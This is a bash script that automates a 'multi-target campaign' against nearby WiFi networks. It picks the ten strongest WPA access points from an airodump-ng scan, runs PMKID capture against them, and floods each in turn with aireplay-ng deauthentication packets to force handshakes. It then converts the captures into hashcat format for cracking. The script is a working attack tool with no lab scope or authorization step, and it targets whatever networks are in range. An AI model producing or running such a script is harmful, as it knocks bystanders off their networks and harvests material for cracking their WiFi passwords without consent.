#!/bin/bash
# workflow_campaign.sh - Multi-target campaign for maximum capture

SESSION="campaign"
DURATION=${1:-7200}  # 2 hours default

echo "[*] Starting multi-target campaign"
echo "[*] Duration: ${DURATION}s ($(($DURATION/3600)) hours)"

# Initial recon scan to identify targets
echo "[*] Running initial reconnaissance..."
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SCAN_FILE=~/captures/raw/campaign_${TIMESTAMP}

sudo timeout 120 airodump-ng wlan1mon -w "$SCAN_FILE" --output-format csv

# Parse top 10 targets by signal strength
echo "[*] Identifying top targets..."
TARGETS_FILE=/tmp/campaign_targets_${TIMESTAMP}.txt

tail -n +2 "${SCAN_FILE}-01.csv" 2>/dev/null | \
    grep -v "Station MAC" | \
    grep "WPA" | \
    awk -F',' '{if($1 != "" && $4 != "") print $4 "\t" $1 "\t" $6 "\t" $14}' | \
    sort -rn | \
    head -10 > "$TARGETS_FILE"

if [ ! -s "$TARGETS_FILE" ]; then
    echo "[-] No WPA targets found"
    exit 1
fi

echo "[*] Found $(wc -l < "$TARGETS_FILE") targets"
cat "$TARGETS_FILE"

# Create tmux session
tmux new-session -d -s "$SESSION" -n "Campaign"

# Window 0: PMKID attack (passive, all targets)
tmux send-keys -t "$SESSION:0" "\
echo '[*] Starting PMKID campaign...' && \
sudo hcxdumptool -i wlan1mon -o ~/captures/pmkid/campaign_${TIMESTAMP}.pcapng \
--enable_status=1 --filterlist_ap=$TARGETS_FILE --filtermode=2" C-m

# Window 1: Rotating targeted attacks
tmux new-window -t "$SESSION:1" -n "Targeted"

# Create attack rotation script
cat > /tmp/campaign_rotate_${TIMESTAMP}.sh <<'SCRIPT_EOF'
#!/bin/bash

TARGETS_FILE=$1
DURATION=$2
TIME_PER_TARGET=300  # 5 minutes per target

echo "[*] Starting rotating targeted attacks"

while IFS=$'\t' read -r signal bssid channel essid; do
    echo "[*] Attacking: $essid ($bssid) on channel $channel"
    
    CAPTURE_FILE=~/captures/wpa/${essid//" "/"_"}_${bssid//:/_}_$(date +%H%M%S)
    
    # Start capture
    sudo airodump-ng -c "$channel" --bssid "$bssid" \
        -w "$CAPTURE_FILE" --output-format pcap \
        wlan1mon &
    AIRODUMP_PID=$!
    
    sleep 5
    
    # Deauth attack for 5 minutes
    timeout $TIME_PER_TARGET bash -c "
        while true; do
            sudo aireplay-ng --deauth 10 -a $bssid wlan1mon
            sleep 30
        done
    "
    
    # Stop capture
    sudo kill $AIRODUMP_PID 2>/dev/null
    
    # Check for handshake
    if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>&1 | grep -q "1 handshake"; then
        echo "[+] HANDSHAKE CAPTURED for $essid"
        hcxpcapngtool -o "${CAPTURE_FILE}.hc22000" "${CAPTURE_FILE}-01.cap"
    else
        echo "[-] No handshake for $essid, moving to next target"
    fi
    
    sleep 10
done < "$TARGETS_FILE"

echo "[*] Rotation complete"
SCRIPT_EOF

chmod +x /tmp/campaign_rotate_${TIMESTAMP}.sh

tmux send-keys -t "$SESSION:1" "\
/tmp/campaign_rotate_${TIMESTAMP}.sh $TARGETS_FILE $DURATION" C-m

# Window 2: Monitoring
tmux new-window -t "$SESSION:2" -n "Status"
tmux send-keys -t "$SESSION:2" "\
watch -n 10 '
echo \"=== CAMPAIGN STATUS ===\"
echo \"\"
echo \"Handshakes captured:\"
find ~/captures/wpa/ -name \"*.cap\" -mmin -120 -exec bash -c \"aircrack-ng {} 2>&1 | grep -q handshake && echo {}\" \;
echo \"\"
echo \"PMKID captures:\"
ls -lht ~/captures/pmkid/*.hc22000 2>/dev/null | head -5
echo \"\"
echo \"Disk usage: \$(df -h / | tail -1 | awk \"{print \\\$5}\")\"
'" C-m

# Window 3: Logs
tmux new-window -t "$SESSION:3" -n "Logs"
tmux send-keys -t "$SESSION:3" "tail -f ~/logs/*.log" C-m

# Auto-stop after duration
(
    sleep "$DURATION"
    tmux kill-session -t "$SESSION"
    
    # Generate report
    REPORT_FILE=~/reports/campaign_${TIMESTAMP}_report.txt
    
    cat > "$REPORT_FILE" <<EOF
Campaign Report
===============
Date: $(date)
Duration: $(($DURATION/3600)) hours
Targets: $(wc -l < "$TARGETS_FILE")

Captures:
EOF
    
    find ~/captures/wpa/ -name "*.cap" -mmin -$(($DURATION/60)) | while read cap; do
        if aircrack-ng "$cap" 2>&1 | grep -q "1 handshake"; then
            echo "  [+] $(basename "$cap") - HANDSHAKE" >> "$REPORT_FILE"
        fi
    done
    
    PMKID_COUNT=$(find ~/captures/pmkid/ -name "*.hc22000" -mmin -$(($DURATION/60)) | wc -l)
    echo "" >> "$REPORT_FILE"
    echo "PMKID Captures: $PMKID_COUNT" >> "$REPORT_FILE"
    
    echo "[*] Campaign complete! Report: $REPORT_FILE"
) &

echo "[*] Campaign session started: $SESSION"
echo "[*] Will run for $(($DURATION/3600)) hours and auto-stop"
echo "[*] Attach with: tmux attach -t $SESSION"
echo "[*] Detach with: Ctrl+A, then D"
echo ""

# Optionally attach
read -p "Attach to session now? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    tmux attach -t "$SESSION"
else
    echo "[*] Running in background"
    echo "[*] Check status: tmux attach -t $SESSION"
    echo "[*] View later: cat ~/reports/campaign_${TIMESTAMP}_report.txt"
fi